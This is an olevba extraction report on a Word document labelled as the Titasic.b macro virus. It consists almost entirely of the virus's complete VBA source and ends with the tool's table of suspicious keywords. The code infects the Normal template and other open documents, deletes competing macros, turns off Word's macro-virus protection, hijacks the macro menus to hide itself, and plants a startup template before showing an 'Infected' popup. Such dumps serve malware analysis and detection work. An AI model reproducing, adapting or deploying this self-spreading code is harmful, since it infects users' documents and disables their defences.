olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Titasic.b-7403dd6e26928d34b75400e0ee7effd2aa2c35c6
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Titasic.b-7403dd6e26928d34b75400e0ee7effd2aa2c35c6 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO BmH.bas 
in file: Virus.MSWord.Titasic.b-7403dd6e26928d34b75400e0ee7effd2aa2c35c6 - OLE stream: 'Macros/VBA/BmH'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 





























Public AD As Object, aDes As Variant
Public NonBmH As Boolean, afound As Boolean, dele As Boolean, reset As Boolean
Public aExc As Boolean, DocCount As Boolean
Function BmHMaster()
    Dim nMac(1) As String
    Dim NT As Object
    Dim aSrc$
    On Error GoTo Selesai
    nMac(0) = "BmH"
    nMac(1) = "Boo"
    
    aSrc = MacroContainer
    Set NT = NormalTemplate
    If Not DocCount Then
        Set AD = ActiveDocument
        ElseIf aSrc <> "SNrml.dot" Then
            aSrc = NT
    End If
    
    If aSrc = NT Then
        aSrc = NT.FullName: Set aDes = AD
    ElseIf aSrc = AD Then
        aSrc = AD.FullName: Set aDes = NT
    ElseIf aSrc = "SNrml.dot" Then
        Set aDes = NT
    aSrc = Options.DefaultFilePath(8) & "\SNrml.src"
    End If
    
    Mdele aDes
    With aDes.VBProject
    If Not (Not dele And .Description = "BmH" And .VBComponents.Count > 2) Then
        MCopy aSrc, aDes, nMac
        dele = False
        .Description = "BmH"
        If aDes = NT Then
            Options.SaveInterval = 1
            CustomizationContext = NT
            CommandBars("Tools").reset
            KeyBindings.Add KeyCode:=BuildKeyCode(77, 1024), KeyCategory:=1, _
            Command:="ToolsRecordMacroStart"
            aDes.Save
        End If
        CommandBars("Macro").Controls(2).OnAction = "ViewVBCode"
    Else
        GoTo Aksi
    End If
    End With
    If afound = True Then Exit Function
    refresh
    On Error Resume Next
Aksi:
    If aExc = True Then Exit Function
    Exit Function
Selesai:
    If Err.Number = 50289 Then MsgBox "Word protected from macro viruses", vbInformation, "Microsoft Word"
End Function

Sub Mdele(SFile)
Dim nMac As Object
For Each nMac In SFile.VBProject.VBComponents
    If nMac.Name = "NewMacros" Then NonBmH = True
    If nMac.Name <> "ThisDocument" And nMac.Name <> "NewMacros" And nMac.Name <> "BmH" _
        And nMac.Name <> "Boo" Then
        dele = True
        If reset Then
            Application.OrganizerDelete SFile.FullName, nMac.Name, 3
        Else
            nMac.CodeModule.DeleteLines 1, nMac.CodeModule.CountOfLines
        End If
    End If
Next nMac
End Sub
Sub MCopy(SFile, DFile, nMac)
Dim anMac
For Each anMac In nMac
    Application.OrganizerCopy SFile, DFile.FullName, anMac, 3
Next
End Sub
Sub Action()
Documents.Add
On Error Resume Next
With ActiveWindow
    .Caption = "Boo"
    Randomize
    Boo.Show
End With
WBT
ActiveDocument.Close 0
WBF
AutoOpen
End Sub
Sub FileOpen()
WBT
If Dialogs(80).Show <> 0 Then
    WBF
    AutoOpen
Else
    WBF
End If
End Sub
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
BmHMaster
If Documents.Count > 1 Then
    For i = 1 To Documents.Count
        If Documents(i).Name <> ActiveDocument.Name Then
            Set AD = Documents(i)
            DocCount = True
            dele = False
            BmHMaster
        End If
    Next
End If
If Now > DateSerial(1998, 8, 7) Then
    Application.OnTime when:=Now + TimeValue("00:15:00"), Name:="BmH.Action"
End If
End Sub
Sub ViewVbCode()
If MsgBox("Are you sure want to create a new macro ?", vbExclamation + vbYesNo, "MacroBasic") = vbYes Then SendKeys "%m%s{down}~%d'MacroWordBasic'%m"
End Sub
Sub AutoExec()
On Error Resume Next
If MacroContainer <> NormalTemplate Then
    aExc = True
    BmHMaster
    WBT
    AddIns.Unload False
    WBF
End If
Application.EnableCancelKey = wdCancelDisabled
End Sub
Sub AutoExit()
Dim aAddin As Object
On Error GoTo batal
WBT
If Documents.Count <> 0 Then Documents.Close
Options.DefaultFilePath(2) = Options.DefaultFilePath(6)
afound = True
For Each aAddin In AddIns
    If aAddin.Name = "SNrml.dot" Then afound = False
Next aAddin
    If afound = True Then
        Application.Visible = False
        Documents.Add
        BmHMaster
        With ActiveDocument
            .SaveAs FileName:=Options.DefaultFilePath(8) & "\SNrml.src", _
            FileFormat:=wdFormatDocument, AddtoRecentFiles:=False
            .SaveAs FileName:=Options.DefaultFilePath(8) & "\SNrml.dot", _
            FileFormat:=wdFormatTemplate, AddtoRecentFiles:=False
        End With
    End If
    Application.Quit
batal:
    WBF
End Sub
Sub ToolsMacro()
WBF
On Error GoTo batal
Mdele ActiveDocument
If NonBmH Then
    'If MacroContainer = ActiveDocument Then Application.Run
    NormalTemplate.VBProject.Name = ".BmH.ToolsMacro": Exit Sub
    Application.DisplayAlerts = 0
    With Dialogs(215)
        .Description = "Macros can not be deleted!(descr:'MacroWordBasic')"
        If .Display = 1 Then .Execute
    End With
    Application.DisplayAlerts = -1
Else
    ViewVbCode
End If
batal:
End Sub
Sub FileTemplates()
WBF
If Not reset Then Dialogs(87).Display
End Sub
Sub FormatStyle()
WBF
Dialogs(180).Show
End Sub
Function refresh()
reset = True
FileTemplates
Mdele aDes
End Function
Sub AutoClose()
Application.DisplayAlerts = -1
With Options
    .SaveNormalPrompt = False
    .SaveInterval = 10
    .VirusProtection = False
End With
If ActiveWindow.Caption <> "Boo" And InStr(1, ActiveDocument.Name, "Document1", 1) = 0 _
    And ActiveDocument.Name <> "SNrml.dot" Then BmHMaster
End Sub
Sub FileExit()
AutoExit
End Sub
Sub ToolsOptions()
Options.DefaultFilePath(wdUserTemplatesPath) = "C:\Program Files\Microsoft Office\Templates"
Dialogs(wdDialogToolsOptions).Show
Options.DefaultFilePath(wdUserTemplatesPath) = Application.Path
End Sub
Function WBT()
WordBasic.DisableAutoMacros True
End Function
Function WBF()
WordBasic.DisableAutoMacros False
End Function
-------------------------------------------------------------------------------
VBA MACRO Boo.frm 
in file: Virus.MSWord.Titasic.b-7403dd6e26928d34b75400e0ee7effd2aa2c35c6 - OLE stream: 'Macros/VBA/Boo'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 





















































Dim teks(4) As String
Private Sub CommandButton1_Click()
Unload Me
End Sub
Private Sub UserForm_Activate()
Image1.Picture = LoadPicture(System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\Desktop", "Wallpaper"))
BmHB
Unload Me
End Sub
Sub BmHB()
Dim a As Byte, diam As Boolean
Dim tp&, tm!, sel!, i%
a = 1
diam = True
Boo.Enabled = False
Do
    DoEvents
    sel = Timer - tm
    tp = tp + 1
    If tp Mod 300 = 0 Then
        Label4.ForeColor = Boo.BackColor
    End If
    If tp Mod 600 = 0 Then
        Label4.ForeColor = &H80000009
    End If
    If sel > 0.1 Then
        tm = Timer
        i = i + 1
        Label1.Caption = Label1.Caption & Mid(teks(a), i, 1)
        If Mid(teks(a), i, 1) Like "[!]" Then Beep
        If Len(Label1.Caption) = Len(teks(a)) Then
            If diam Then
                Do
                    If Timer - tm > 1 Then Exit Do
                        DoEvents
                        Label4.ForeColor = Boo.BackColor
                Loop
                        diam = False
                        If a = 4 Then GoTo catat
            End If
            Label2.Move Label2.Left - 9
            If Label2.Left <= Label1.Left Then GoSub catat
        End If
    End If
    Loop
    Exit Sub
catat:
    If a <> 5 Then Label1.Caption = ""
    tm = Timer
    Label2.Left = Label1.Left
    a = a + 1
    i = 0
    diam = True
    If a = 5 Then
        Label2.Left = Label1.Left
        Label4.Visible = False
        Frame1.Visible = True
        Image1.Visible = True
        Boo.Enabled = True
        CommandButton1.SetFocus
        Exit Sub
    End If
Return
End Sub
Private Sub UserForm_Layout()
teks(1) = "Infected Boomv1.01"
teks(2) = "Me, No longer to stay in your computer!"
teks(3) = "Beware of the Boomv1.01!"
Label2.Left = Label1.Left
Label3.Caption = "BmH guess who(m) am I" & Chr(13) & "thanks to " & Application.UserName
End Sub
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.b-7403dd6e26928d34b75400e0ee7effd2aa2c35c6' - OLE stream: 'Macros/Boo/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�\Close@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.b-7403dd6e26928d34b75400e0ee7effd2aa2c35c6' - OLE stream: 'Macros/Boo/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Symbol@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.b-7403dd6e26928d34b75400e0ee7effd2aa2c35c6' - OLE stream: 'Macros/Boo/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.b-7403dd6e26928d34b75400e0ee7effd2aa2c35c6' - OLE stream: 'Macros/Boo/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�EHNN-07081997 Happy Wedding
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.b-7403dd6e26928d34b75400e0ee7effd2aa2c35c6' - OLE stream: 'Macros/Boo/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.b-7403dd6e26928d34b75400e0ee7effd2aa2c35c6' - OLE stream: 'Macros/Boo/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.b-7403dd6e26928d34b75400e0ee7effd2aa2c35c6' - OLE stream: 'Macros/Boo/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Titasic.b-7403dd6e26928d34b75400e0ee7effd2aa2c35c6' - OLE stream: 'Macros/Boo'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame1'" IN 'Virus.MSWord.Titasic.b-7403dd6e26928d34b75400e0ee7effd2aa2c35c6' - OLE stream: 'Macros/Boo'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Titasic.b-7403dd6e26928d34b75400e0ee7effd2aa2c35c6' - OLE stream: 'Macros/Boo/i09'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Titasic.b-7403dd6e26928d34b75400e0ee7effd2aa2c35c6' - OLE stream: 'Macros/Boo/i09'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Titasic.b-7403dd6e26928d34b75400e0ee7effd2aa2c35c6' - OLE stream: 'Macros/Boo/i09'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Virus.MSWord.Titasic.b-7403dd6e26928d34b75400e0ee7effd2aa2c35c6' - OLE stream: 'Macros/Boo/i09'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN 'Virus.MSWord.Titasic.b-7403dd6e26928d34b75400e0ee7effd2aa2c35c6' - OLE stream: 'Macros/Boo/i09'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|AutoExec  |UserForm_Layout     |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

